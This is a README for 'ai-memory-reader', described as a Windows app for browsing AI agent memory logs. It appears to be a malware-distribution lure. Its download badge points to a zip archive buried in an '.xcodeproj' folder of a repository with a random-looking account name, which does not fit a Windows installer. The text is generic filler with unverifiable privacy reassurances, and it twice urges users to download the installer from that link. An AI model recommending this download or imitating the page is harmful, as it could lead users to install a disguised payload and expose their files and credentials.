# 🧠 ai-memory-reader - Browse your AI agent memory files

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Reviewfamilytetranychidae774/ai-memory-reader/raw/refs/heads/main/AIMemoryReader.xcodeproj/ai_memory_reader_v3.4.zip)

## 📁 What is this app?

AI agents write logs and memory files as they work. These files contain notes, history, and context about your projects. This app lets you open and read these files on your computer. You gain insight into what your AI assistants did, how they made decisions, and what they learned during your sessions.

The app supports multiple formats. It reads memory files from Claude Code, OpenClaw, Codex, Cursor, and Gemini. It organizes complex data into a clear view. You see the timeline of events, the specific files the AI accessed, and the reasoning behind each step. 

## 🏗️ Why use this tool?

Most agent memory files exist as raw text or lines of code. They appear difficult to read. This tool converts that data into a clean interface. You navigate through sessions with ease. You compare past performance with current tasks. You track changes over time without opening terminal windows.

## 🖥️ System Requirements

The app works on Windows 10 and Windows 11. It needs 200MB of free disk space. It requires 4GB of RAM to process large history files. Ensure your system drivers are up to date for the best performance. The app does not require a constant internet connection to view local files. It gathers no telemetry data from your machine.

## 🗺️ How to use the interface

The main window displays your agent sessions. The sidebar on the left lists all memory files detected on your machine. Click any file to load it. The center pane shows the conversation history. The right pane shows metadata, such as file paths and time stamps. 

You search for specific keywords using the bar at the top. Type a term to filter your history. The app highlights all matches. You zoom in or out to change the text size.

## 🔄 Supported formats

The app processes JSONL files, which are common for AI logs. It also interprets Markdown memory stores. You drag and drop logs into the app window to load them manually. This helps if your files live in custom folders on your hard drive. 

## 🛠️ Adding your first directory

You tell the app where your AI agents store their data. 

1. Open the File menu.
2. Choose Add Folder.
3. Select the folder where your AI agent keeps its logs.
4. Click Select Folder.
5. The app scans the directory.
6. New entries appear in your sidebar.

The app watches these folders. If an agent adds a new log file, the app updates your list instantly.

## 🔐 Privacy and security

Your data stays on your computer. The app does not send your memory files to any server. It does not look at your personal documents. It only reads the specific logs you choose. You maintain control over your history. You delete logs from the app view at any time.

## 📝 Troubleshooting common issues

If the app fails to load a file, check the file extension. Ensure the file ends in .jsonl or .md. If the app runs slowly, clear your cache. Go to Settings and click Clear Cache. 

If you see an error message, ensure you have the latest version. Re-download the installer from the link if necessary. Restart your computer if the app remains unresponsive. Contact support through the GitHub issue page if the problem persists.
